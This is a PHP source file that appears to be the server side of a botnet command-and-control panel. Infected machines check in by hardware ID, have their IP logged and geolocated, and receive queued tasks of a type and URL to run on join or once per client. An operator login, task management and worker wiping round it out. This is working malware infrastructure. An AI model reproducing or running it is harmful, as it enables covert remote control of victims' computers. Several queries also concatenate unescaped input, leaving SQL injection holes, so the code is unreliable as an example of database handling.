<?php
include('config.php');
session_start();

if (isset($_POST['login']) && isset($_POST['password']) && isset($_POST['change']))
{
    $l = mysql_real_escape_string($_POST['login']);
    $p = mysql_real_escape_string($_POST['password']);
    mysql_query("UPDATE `userinfo` SET `login`='$l', `password`='$p' WHERE `id` < 10");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if (isset($_POST['login']) && isset($_POST['password']))
{
    $l = mysql_real_escape_string($_POST['login']);
    $p = mysql_real_escape_string($_POST['password']);

    if(mysql_num_rows(mysql_query("SELECT * FROM `userinfo` WHERE `login`='$l' AND `password`='$p'")) > 0){
        $_SESSION['auth'] = 'true';
        echo 'true';
        
    }     
}

else if (isset($_GET['completed'])){
     $hwid = mysql_real_escape_string($_GET['hwid']);
     $id = mysql_real_escape_string($_GET['completed']);
     mysql_query("INSERT INTO `completed` SET `hwid`='$hwid', `taskid`='$id'");
     echo mysql_error();
}

else if (isset($_GET['hwid'])){
    $hwid = mysql_real_escape_string($_GET['hwid']);
    $d = date('m/d/Y h:i:s a', time());   
    if(mysql_num_rows(mysql_query("SELECT * FROM `workers` WHERE `hwid`='$hwid'")) > 0){
        date_default_timezone_set('Etc/GMT+3');
        mysql_query("UPDATE `workers` SET `seen`='$d', `ip`='".$_SERVER['REMOTE_ADDR']."' WHERE `hwid`='$hwid'");

        $response = "";
        $tasks = mysql_query("SELECT * FROM `tasks` WHERE `trigger`='On join' AND `status`='ACTIVE'");
        for ($x = 0; $x < mysql_num_rows($tasks); $x++){
            $task = mysql_fetch_assoc($tasks);
            $response .= $task['type'].";".$task['url'].";".$task['id']."|";
        }

        $tasks = mysql_query("SELECT * FROM `tasks` WHERE `trigger`='Every client once' AND `status`='ACTIVE'");
        for ($x = 0; $x < mysql_num_rows($tasks); $x++){
            $task = mysql_fetch_assoc($tasks);
            if(mysql_num_rows(mysql_query("SELECT * FROM `completed` WHERE `hwid`='$hwid' AND `taskid`='".$task['id']."'")) < 1)
                $response .= $task['type'].";".$task['url'].";".$task['id']."|";
        }

        echo $response;

    }
    else{
        $loc = json_decode(file_get_contents('http://freegeoip.net/json/'.$_SERVER['REMOTE_ADDR']), true);
        $c = $loc['country_code'];
        mysql_query("INSERT INTO `workers` SET `ip`='".$_SERVER['REMOTE_ADDR']."', `hwid`='$hwid', `seen`='$d', `location`='$c'");

        $response = "";
        $tasks = mysql_query("SELECT * FROM `tasks` WHERE `trigger`='On join' AND `status`='ACTIVE'");
        for ($x = 0; $x < mysql_num_rows($tasks); $x++){
            $task = mysql_fetch_assoc($tasks);
            $response .= $task['type'].";".$task['url'].";".$task['id']."|";
        }

        $tasks = mysql_query("SELECT * FROM `tasks` WHERE `trigger`='Every client once' AND `status`='ACTIVE'");
        for ($x = 0; $x < mysql_num_rows($tasks); $x++){
            $task = mysql_fetch_assoc($tasks);
            if(mysql_num_rows(mysql_query("SELECT * FROM `completed` WHERE `hwid`='$hwid' AND `taskid`='".$task['id']."'")) < 1)
                $response .= $task['type'].";".$task['url'].";".$task['id']."|";
        }

        echo $response;
    }
}

else if (isset($_POST['navbar'])){
    $n = mysql_real_escape_string($_POST['navbar']);
    $nv = "";
    if($n == 'Black')
        $nv = 'inverse';
    else
        $nv = 'default';
    mysql_query("UPDATE `userinfo` SET `navbar`='".$nv."' WHERE `id` < 10");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if (isset($_POST['taskid'])){
    $action = $_POST['action'];
    if ($action == 'Delete'){
        mysql_query("DELETE FROM `tasks` WHERE `id`='".$_POST['taskid']."'");
    }
    else if ($action == 'Stop'){
        mysql_query("UPDATE `tasks` SET `status`='STOPPED' WHERE `id`='".$_POST['taskid']."'");
    }
    else if ($action == 'Start'){
        mysql_query("UPDATE `tasks` SET `status`='ACTIVE' WHERE `id`='".$_POST['taskid']."'");
    }
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if(isset($_POST['trigger'])){
    mysql_query("INSERT INTO `tasks` SET `type`='".mysql_real_escape_string($_POST['type'])."', `trigger`='".mysql_real_escape_string($_POST['trigger'])."', `name`='".mysql_real_escape_string($_POST['name'])."', `url`='".mysql_real_escape_string($_POST['url'])."', `status`='ACTIVE'");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if(isset($_POST['reconnect'])){
    mysql_query("UPDATE `userinfo` SET `reconnect`='".mysql_real_escape_string($_POST['reconnect'])."' WHERE `id` < 10");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if(isset($_GET['timeout'])){
    $tm = mysql_fetch_assoc(mysql_query("SELECT * FROM `userinfo`"));
    echo $tm['reconnect'];
}

else if (isset($_POST['del'])){
    mysql_query("DELETE FROM `workers` WHERE `id` < 999999");
    echo mysql_error();
   header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if (isset($_POST['color'])){
    mysql_query("UPDATE `userinfo` SET `color`='".$_POST['color']."' WHERE `id` < 10");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}

else if (isset($_POST['sound'])){
    mysql_query("UPDATE `userinfo` SET `sound`='".$_POST['on']."' WHERE `id` < 10");
    header("Location: ".$_SERVER['HTTP_REFERER']."");
}



